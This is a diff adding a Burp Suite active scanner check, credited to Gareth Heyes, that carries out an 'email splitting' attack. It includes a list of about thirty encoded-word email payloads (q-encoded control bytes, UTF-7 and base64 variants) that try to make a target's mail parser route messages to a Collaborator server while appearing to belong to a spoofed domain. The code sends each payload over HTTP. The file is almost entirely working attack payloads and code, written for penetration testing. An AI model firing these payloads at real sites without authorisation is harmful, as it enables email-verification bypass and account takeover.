@@ -1,0 +1,62 @@
+id: 5ce07589-6bec-4aec-8c86-ae26974bc17f
+name: Email splitting default collaborator
+function: SCAN_CHECK_ACTIVE_PER_INSERTION_POINT
+location: SCANNER
+source: |
+  /**
+   * Performs an email splitting attack using encoded word.
+   * The default Collaborator client is used to retrieve interactions.
+   * You should change the spoofServer to be your target domain e.g. example.com
+   *
+   * @author Gareth Heyes
+  **/
+
+  var techniques = new String[]{
+          "=?x?q?$COLLABORATOR_PAYLOAD=40$COLLABORATOR_SERVER=3e=00?=foo@$SPOOF_SERVER",
+          "=?x?q?$COLLABORATOR_PAYLOAD=40$COLLABORATOR_SERVER=3e=01?=foo@$SPOOF_SERVER",
+          "=?x?q?$COLLABORATOR_PAYLOAD=40$COLLABORATOR_SERVER=3e=02?=foo@$SPOOF_SERVER",
+          "=?x?q?$COLLABORATOR_PAYLOAD=40$COLLABORATOR_SERVER=3e=03?=foo@$SPOOF_SERVER",
+          "=?x?q?$COLLABORATOR_PAYLOAD=40$COLLABORATOR_SERVER=3e=04?=foo@$SPOOF_SERVER",
+          "=?x?q?$COLLABORATOR_PAYLOAD=40$COLLABORATOR_SERVER=3e=05?=foo@$SPOOF_SERVER",
+          "=?x?q?$COLLABORATOR_PAYLOAD=40$COLLABORATOR_SERVER=3e=07?=foo@$SPOOF_SERVER",
+          "=?x?q?$COLLABORATOR_PAYLOAD=40$COLLABORATOR_SERVER=3e=08?=foo@$SPOOF_SERVER",
+          "=?x?q?$COLLABORATOR_PAYLOAD=40$COLLABORATOR_SERVER=3e=0e?=foo@$SPOOF_SERVER",
+          "=?x?q?$COLLABORATOR_PAYLOAD=40$COLLABORATOR_SERVER=3e=0f?=foo@$SPOOF_SERVER",
+          "=?x?q?$COLLABORATOR_PAYLOAD=40$COLLABORATOR_SERVER=3e=10?=foo@$SPOOF_SERVER",
+          "=?x?q?$COLLABORATOR_PAYLOAD=40$COLLABORATOR_SERVER=3e=11?=foo@$SPOOF_SERVER",
+          "=?x?q?$COLLABORATOR_PAYLOAD=40$COLLABORATOR_SERVER=3e=13?=foo@$SPOOF_SERVER",
+          "=?x?q?$COLLABORATOR_PAYLOAD=40$COLLABORATOR_SERVER=3e=15?=foo@$SPOOF_SERVER",
+          "=?x?q?$COLLABORATOR_PAYLOAD=40$COLLABORATOR_SERVER=3e=16?=foo@$SPOOF_SERVER",
+          "=?x?q?$COLLABORATOR_PAYLOAD=40$COLLABORATOR_SERVER=3e=17?=foo@$SPOOF_SERVER",
+          "=?x?q?$COLLABORATOR_PAYLOAD=40$COLLABORATOR_SERVER=3e=19?=foo@$SPOOF_SERVER",
+          "=?x?q?$COLLABORATOR_PAYLOAD=40$COLLABORATOR_SERVER=3e=1a?=foo@$SPOOF_SERVER",
+          "=?x?q?$COLLABORATOR_PAYLOAD=40$COLLABORATOR_SERVER=3e=1b?=foo@$SPOOF_SERVER",
+          "=?x?q?$COLLABORATOR_PAYLOAD=40$COLLABORATOR_SERVER=3e=1c?=foo@$SPOOF_SERVER",
+          "=?x?q?$COLLABORATOR_PAYLOAD=40$COLLABORATOR_SERVER=3e=1d?=foo@$SPOOF_SERVER",
+          "=?x?q?$COLLABORATOR_PAYLOAD=40$COLLABORATOR_SERVER=3e=1f?=foo@$SPOOF_SERVER",
+          "=?x?q?$COLLABORATOR_PAYLOAD=40$COLLABORATOR_SERVER=3e=20?=foo@$SPOOF_SERVER",
+          "=?x?q?$COLLABORATOR_PAYLOAD=40$COLLABORATOR_SERVER=2c?=x@$SPOOF_SERVER",
+          "=?utf-7?q?$COLLABORATOR_PAYLOAD&AEA-$COLLABORATOR_SERVER&ACw-?=foo@$SPOOF_SERVER",
+          "=?utf-7?q?$COLLABORATOR_PAYLOAD&AEA-$COLLABORATOR_SERVER&ACw=/xyz!-?=foo@$SPOOF_SERVER",
+          "=?utf-7?q?$COLLABORATOR_PAYLOAD=26AEA-$COLLABORATOR_SERVER=26ACw-?=foo@$SPOOF_SERVER",
+          "$COLLABORATOR_PAYLOAD=?utf-7?b?JkFFQS0?=$COLLABORATOR_SERVER=?utf-7?b?JkFDdy0?=foo@$SPOOF_SERVER",
+          "$COLLABORATOR_PAYLOAD=?x?b?QA==?=$COLLABORATOR_SERVER=?x?b?LA==?=foo@$SPOOF_SERVER",
+          "=?utf-7?q?$COLLABORATOR_PAYLOAD&AEA-$COLLABORATOR_SERVER&ACA-?=foo@$SPOOF_SERVER",
+          "=?utf-7?q?$COLLABORATOR_PAYLOAD&AEA-$COLLABORATOR_SERVER&ACA=/xyz!-?=foo@$SPOOF_SERVER",
+          "=?utf-7?q?$COLLABORATOR_PAYLOAD=26AEA-$COLLABORATOR_SERVER=26ACA-?=foo@$SPOOF_SERVER",
+          "$COLLABORATOR_PAYLOAD=?utf-7?b?JkFFQS0?=$COLLABORATOR_SERVER=?utf-7?b?JkFDdy0?=foo@$SPOOF_SERVER",
+          "$COLLABORATOR_PAYLOAD=?x?b?QA==?=$COLLABORATOR_SERVER=?x?b?LA==?=foo@$SPOOF_SERVER"
+  };
+
+  var spoofServer = "target.domain";
+
+  for(var technique: techniques) {
+      var payload = api().collaborator().defaultPayloadGenerator().generatePayload();
+      technique = technique.replaceAll("[$]COLLABORATOR_SERVER", payload.server().get().address());
+      technique = technique.replaceAll("[$]COLLABORATOR_PAYLOAD", payload.id().toString());
+      technique = technique.replaceAll("[$]SPOOF_SERVER", spoofServer);
+      
+  	HttpRequestResponse reqResp = http.sendRequest(insertionPoint.buildHttpRequestWithPayload(ByteArray.byteArray(technique)));
+  }
+
+  return null;
